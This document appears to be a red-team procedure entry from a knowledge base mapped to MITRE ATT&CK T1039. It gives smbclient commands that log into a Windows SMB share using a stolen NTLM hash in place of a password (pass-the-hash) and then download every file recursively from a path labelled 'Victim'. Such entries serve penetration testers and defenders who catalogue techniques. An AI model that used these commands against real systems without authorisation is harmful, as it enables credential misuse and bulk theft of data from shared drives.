---
id: e3055560-9e5b-4666-bff4-ff647d10b1cd
name: Recursively Download Files From an SMB Share
type: procedure
verified: true
submitted: true
created_at: '2019-09-19T22:36:11.177562+00:00'
updated_at: '2023-05-25T19:46:23.343180+00:00'
tactics:
- '[[Collection|TA0009 - Collection]]'
techniques:
- '[[Data from Network Shared Drive|T1039 - Data from Network Shared Drive]]'
tags:
- '[[data exposure]]'
- '[[Network]]'
commands:
- '[[smbclient Connect to an SMB Share (NTLM)]]'
- '[[smbclient Download All Files Recursively From SMB]]'
---

# Recursively Download Files From an SMB Share

**Status**: ✓ Verified

## Summary

This procedure steps through authenticating with a Windows SMB share using an NTLM hash instead of a password. 

## Description

# Description

This procedure steps through authenticating with a Windows SMB share using an NTLM hash instead of a password.

# Instructions

1.  Connect to the SMB. This example uses an NTLM hash for authentication, but if a password is used instead, remove the "--pw-nt-hash" argument and replace "$_NTLM:$_NTLM" with the password.

**Command** ([[smbclient Connect to an SMB Share (NTLM)]]):

```bash
smbclient -U $_USERNAME%$_NTLM_HASH:$_NTLM_HASH --pw-nt-hash //$_TARGET_IP/$_SHARE_NAME
```

2. Turn on recursion,  turn off prompt, then download all files.

**Command** ([[smbclient Download All Files Recursively From SMB]]):

```bash
smb: \Victim\> RECURSE ON
smb: \Victim\> PROMPT OFF
smb: \Victim\> mget *
```

## MITRE ATT&CK Mapping

### Tactics

- [[Collection|TA0009 - Collection]]

### Techniques

- [[Data from Network Shared Drive|T1039 - Data from Network Shared Drive]]

## Commands Used

- [[smbclient Connect to an SMB Share (NTLM)]]
- [[smbclient Download All Files Recursively From SMB]]

## Tags

- [[data exposure]]
- [[Network]]
